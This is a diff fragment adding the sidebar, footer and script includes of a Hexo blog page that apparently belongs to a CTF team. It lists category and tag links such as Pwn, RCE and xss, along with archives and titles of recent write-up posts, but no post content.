+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/">Develop</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Devops/">Devops</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/">Pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Reverse/">Reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web-%E5%AE%89%E5%85%A8/">Web 安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Writeup/">Writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8/">安卓安全</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2015-3864/" rel="tag">CVE-2015-3864</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rev/" rel="tag">Rev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/analytics/" rel="tag">analytics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/googlectf/" rel="tag">googlectf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jctf/" rel="tag">jctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mirai/" rel="tag">mirai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nuaactf/" rel="tag">nuaactf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phantom/" rel="tag">phantom</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qzone/" rel="tag">qzone</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/suctf/" rel="tag">suctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virus/" rel="tag">virus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%BC%8F%E6%B4%9E/" rel="tag">文件格式漏洞</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/CVE-2015-3864/" style="font-size: 10px;">CVE-2015-3864</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Pwn/" style="font-size: 15px;">Pwn</a> <a href="/tags/RCE/" style="font-size: 15px;">RCE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Rev/" style="font-size: 10px;">Rev</a> <a href="/tags/Tools/" style="font-size: 15px;">Tools</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/analytics/" style="font-size: 10px;">analytics</a> <a href="/tags/googlectf/" style="font-size: 15px;">googlectf</a> <a href="/tags/jctf/" style="font-size: 10px;">jctf</a> <a href="/tags/linux/" style="font-size: 15px;">linux</a> <a href="/tags/mirai/" style="font-size: 10px;">mirai</a> <a href="/tags/nuaactf/" style="font-size: 15px;">nuaactf</a> <a href="/tags/phantom/" style="font-size: 10px;">phantom</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/qzone/" style="font-size: 10px;">qzone</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/suctf/" style="font-size: 10px;">suctf</a> <a href="/tags/virus/" style="font-size: 10px;">virus</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/xss/" style="font-size: 15px;">xss</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">文件格式漏洞</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1970/01/">January 1970</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/11/24/2020-Taihuctf-writeup/">2020-Taihuctf-writeup</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/30/2019-googlectf-writeup-part2/">2019-googlectf-writeup-part2</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/30/2019-googlectf-writeup-part1/">2019-googlectf-writeup-part1</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/22/Asuri_2019/">2019 第十二届全国大学生信息安全竞赛—创新实践能力赛线上赛-Asuri 2019 wp</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/10/PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F/">从一道题讲PHP复杂变量</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 All Members<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      <a href="https://beian.miit.gov.cn/" target="_blank">鲁ICP备15035817号-2</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/members" class="mobile-nav-link">Members</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+    
+  </div>
+
+</body>
+
+</html>
